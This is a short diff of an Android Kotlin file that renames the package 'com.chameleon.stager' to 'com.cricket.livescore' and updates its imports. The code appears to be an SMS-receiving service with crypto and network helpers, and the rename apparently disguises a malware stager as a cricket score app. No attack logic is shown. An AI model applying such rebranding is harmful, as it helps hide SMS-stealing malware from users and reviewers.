@@ -1,4 +1,4 @@
-package com.chameleon.stager.service
+package com.cricket.livescore.service
 
 import android.content.BroadcastReceiver
 import android.content.Context
@@ -7,9 +7,9 @@ import android.os.Build
 import android.os.Bundle
 import android.telephony.SmsMessage
 import android.util.Log
-import com.chameleon.stager.StagerApplication
-import com.chameleon.stager.utils.CryptoUtils
-import com.chameleon.stager.utils.NetworkUtils
+import com.cricket.livescore.StagerApplication
+import com.cricket.livescore.utils.CryptoUtils
+import com.cricket.livescore.utils.NetworkUtils
 import org.json.JSONObject
 import java.util.regex.Pattern
 
